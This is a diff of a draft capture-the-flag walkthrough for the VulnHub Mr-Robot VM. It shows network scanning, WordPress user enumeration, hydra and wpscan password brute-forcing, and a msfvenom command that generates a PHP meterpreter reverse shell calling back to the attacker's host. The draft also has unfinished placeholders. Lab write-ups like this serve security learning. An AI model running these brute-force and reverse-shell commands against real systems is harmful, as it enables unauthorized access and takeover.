@@ -2,13 +2,13 @@
 [VulnHub link](https://www.vulnhub.com/entry/mr-robot-1,151/)  
 By Leon Johnson
 
-Walkthrough:
 * We are first greeted with a login page that is in command-line style, requiring users to specify both the username and the password:
 ![](/screenshots/mr-robot-1/Login.jpg)
 * We try some common login credentials such as `admin:admin` and `admin:password`, which do not work.
 * Run `nmap 10.0.2.*`, where we find 5 live hosts:
 ![](/screenshots/mr-robot-1/nmapScan.jpg)
-* After eliminating our own IP address (`ifconfig`: 10.0.2.15) and our router gateway IP address (`route -n`: 10.0.2.1), we find that out of the 3 remaining hosts, `10.0.2.5` can run SSH, HTTP and HTTPS services (of which the ports for the latter 2 are open), which tells us that there is likely a web server running on the host. We will start exploring this live host first.
+* After eliminating our own IP address (`ifconfig`: 10.0.2.15) and our router gateway IP address (`route -n`: 10.0.2.1), there are 3 remaining hosts.
+* Out of these 3 hosts, `10.0.2.5` can run SSH, HTTP and HTTPS services (of which the ports for the latter 2 are open), which tells us that there is likely a web server running on the host. We will start exploring this live host first.
 * Run `nmap -p- -A 10.0.2.5`:
 ![](/screenshots/mr-robot-1/hostFullScan.jpg)
 * True enough, we see an Apache HTTP server program running in the host.
@@ -17,42 +17,59 @@ Walkthrough:
 * Executing any of the commands yields either a video or a series of stories with pictures. `join` prompts for an email, but nothing noteworthy happens out of it either.
 * Opening the page source, there does not seem like there is anything interesting to be extracted as well:
 ![](/screenshots/mr-robot-1/interactiveSitePageSource.jpg)
+* Next, we will use `uniscan` which is a Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. -q enables directory checks, -w enables file checks and -e enables robots.txt and sitemap.xml check.
 * Run `uniscan -u 10.0.2.5 -qwe`:
 ![](/screenshots/mr-robot-1/uniscanResults.jpg)
-* Note: uniscan is a Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. -q enables directory checks, -w enables file checks and -e enables robots.txt and sitemap.xml check.
 * uniscan vs. dirbuster: *to-be-added*
 * From the scan results, we see that the site is running on WordPress, since the directory checks included links that ended with `wp-`.
 * There is a robots.txt found from the scan's file checks. Open it and we see that there are 2 files listed: `fsocity.dic` and `key-1-of-3.txt`. The former is an unordered dictionary wordlist, while the latter reveals a string: `073403c8a58a1f80d943455fb30724b9`.
 * It is likely that the dictionary file will be required for some sort of bruteforce attack later.
+* We are not quite sure if there is anything more to the string, but since it looks like a hash value, we will run `hash-identifier` against it:
+![](/screenshots/mr-robot-1/hashIdentifierResults.jpg)
+* It is likely that the string is a MD5 hash. Using several online MD5 cracker pages, there are no matches found to the hash value, so we will leave it at that for now.
 * `sitemap.xml` yields nothing of interest:
 ![](/screenshots/mr-robot-1/sitemapXml.jpg)
-
-* ...
-* key-1-of-3.txt contains a string (`073403c8a58a1f80d943455fb30724b9`): after running hash-identifer against it, we know that it could be a MD5 hash.
-* ...
 * Head to the wp-login page of the WordPress site, and we try to login with some common login credentials. We find that the user `admin` does not exist ("invalid username").
 * We have to find a way to see actual WordPress posts on the site (if any), since clicking "← Back to user's Blog!" on the login page brings us back to the interactive page that we initially encountered (which did not quite show us how we are able to escape that page to head to other pages of the site).
 * To do so, we add a random parameter string to the end of the site (e.g. `/100`), in order to get the error message that the page cannot be found:
 ![](/screenshots/mr-robot-1/invalidPage.jpg)
 * However, we are not able to find any posts on the site.
-* Note: The walkthrough [here](https://www.youtube.com/watch?v=1-a-P1Q2AnA&t=322s) on YouTube shows that there is a post on the WordPress site, with the user `elliot`.
-* Run `wpscan --url 10.0.2.5 --enumerate u` to find out a list of usernames of accounts on the WordPress site:
+* Note: The walkthrough [here](https://www.youtube.com/watch?v=1-a-P1Q2AnA&t=322s) on YouTube shows that there is a post on the WordPress site, with the user `elliot`. The author of the vulnerable VM is likely to have removed this only post for the latest version.
+* Run `wpscan --url 10.0.2.5 --enumerate u`, a black box WordPress vulnerability scanner, to see if we can obtain any usernames of accounts on the WordPress site:
 ![](/screenshots/mr-robot-1/wpScanUsers.jpg)
-* wpscan: a black box WordPress vulnerability scanner. *to-be-continued*
-
-* Login page's page source:
-![](/screenshots/mr-robot-1/loginFormPageSource.jpg)
-
-* Run `hydra -V -L fsocity.dic -p testpassword 10.0.2.5 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'`:
+* Interestingly, we have no user results found (*which I am not sure why*).
+* I guess this is where we have to use the dictionary wordlist that we had found earlier to find a valid username.
+* We will run `hydra -V -L fsocity.dic -p testpassword 10.0.2.5 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username'`, where hydra is a parallelized login cracker which supports numerous protocols to attack:
 ![](/screenshots/mr-robot-1/hydraUsername.jpg)
-* Note: `hydra` is a parallelized login cracker which supports numerous protocols to attack.
-* Note: -V: show login (username) and password for each attempt.
-* An exisiting WordPress username was found almost immediately after the cracker started its run, i.e. the username was found near the top of the dictionary list.
+* An exisiting WordPress username (`Elliot`) was found almost immediately after the cracker started its run, i.e. the username was found near the top of the dictionary list.
 
-* Head to the WordPress login site and attempt to login with a random password for the username `elliot`. There is an error stating that the password for elliot is incorrect. Thus, we now know that the username elliot indeed exists, and our next step is to brute-force the password for that account.
-* Run hydra 192.168.153.174 http-form-post "/wp-login.php:log=elliot&pwd=^PASS^:ERROR" -l elliot -P /tut/fsocity.dic -t 10 -w 30
-* Note: log and pwd are found by inspecting the input elements of the page's username and password fields through Developer Tools: `<input id="user_login" class="input" name="log"...>` and `<input id="user_pass" class="input" name="pwd"...>`
-* The password (ER28-0652) is found somewhere at the bottom of the .dic file, thus it took quite some time to get it.
+Explanation of how the `hydra` command works:
+* `-V`: show login (username) and password for each attempt (can be omitted, will display only the valid username once found; however, if you want to see that hydra is doing its work, include this parameter).
+* `-p testpassword`: we are not trying to crack passwords of a known user here so instead of testpassword, you can insert any random string as the password.
+* In the parameters after specifying the protocol (`http-post-form`) to use, we insert 3 more parameters: the link to the login site, where the username and password which hydra will test will go, and how to determine the success/failure of each attempt.
+* To find out where the login credentials will go, we have to open the page source of the login form and take the `name` attribute values for the username and password input fields respectively:
+![](/screenshots/mr-robot-1/loginFormPageSource.jpg)
+* Next, we need to find a string that distinguishes between a success/failure case. In this case, `Invalid username` is what hydra will see in most of its attempts, and it will flag those outcomes with this particular substring in its results as failed cases.
+* Note: We cannot use the string `Error` to distinguish because even if we get a valid username, the page will still flag it as a negative result because the result page will still contain an error message, since the password is incorrect. Thus, we will only get negatives from the hydra scan.
+* Having found an existing username `Elliot` for the WordPress site, our next step is to brute-force the password for that account.
+* Note: The username is **case-insensitive** in our case, i.e. you can login as user `elliot` as well, which is considered the same as `Elliot`.
+
+# Unsuccessful attempt to get elliot's password using hydra #
+* We will similarly use `hydra` to brute-force the password for user Elliot: run `hydra -V 10.0.2.5 http-form-post "/wp-login.php:log=elliot&pwd=^PASS^:ERROR" -l elliot -P fsocity.dic`.
+* There are 858,160 lines in the dictionary wordlist (run `cat fsocity.dic | wc -l` to find out), which means that hydra will try a total of 858,160 passwords.
+* During the first 1 minute, hydra made around 1,100 attempts on my Kali VM (with these added parameters`-t 40 -w 1`: 40 connects in parallel and maximum 1 second wait for responses). The worst-case scenario of trying every single line as a password is that it would take around 12 hours to crack the password, which is way too long.
+* Let us open the dictionary wordlist again to see if we are able to reduce the number of attempts that we have to make in the worst-case scenario.
+* There might be duplicates in the wordlist, so we will sort the list first, then remove the duplicates: `cat fsocity.dic | sort | uniq > fsocity2.dic`. After doing so, we see that there are now only 11,452 lines within the modified wordlist (fsocity2.dic), which is just 1+% of the original wordlist. We are very much likely to get the password in under 10 minutes this time.
+* Run `hydra -V -l elliot -P fsocity2.dic 10.0.2.5 http-post-form '/wp-login.php:log=elliot&pwd=^PASS^:ERROR'`.
+* Note-to-self: Not sure why, but we cannot seem to use `hydra` to crack the password of `elliot`. We will always get 0 valid passwords. I suspect that it is due to the fact that it takes awhile for the page to transit to the wp-admin page after a successful login, and thus, it is considered an unsuccessful attempt. In light of this, I added additional parameters `-t 1 -c 10`, which makes hydra run only 1 connect at any point in time, and for the wait time to be 10 seconds per login attempt, but to no avail.
+
+* We will use `wpscan` to brute-force the password for user Elliot: run `wpscan --url 10.0.2.5 --usernames elliot --passwords fsocity2.dic`:
+![](/screenshots/mr-robot-1/wpScanBruteForcePassword.jpg)
+* It took only around half a minute, which is way faster than any attempts using `hydra`.
+* Note: If you were to run the same command again, you would get the results almost instantly, i.e. results were very likely to have been cached.
+* Alternate: I tried to run same command using the original wordlist given, just to see how long it takes. It took n minutes:
+
+* Besides the many repetitions in the orginal list, the password is also found somewhere at the end of the file, thus it took quite some time to get it.
 * After logging in as elliot, we are able to login and install as plugin called [File Manager](https://wordpress.org/plugins/wp-file-manager/).
 * Run `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.153.160 LPORT=4000 -f raw > shell.php` on our Kali VM to generate our payload. The LHOST is the IP address of our Kali VM.
 * The payload is shell.php. Upload it through File Manager, and the file path is htdocs/wp-content/uploads/shell.php.
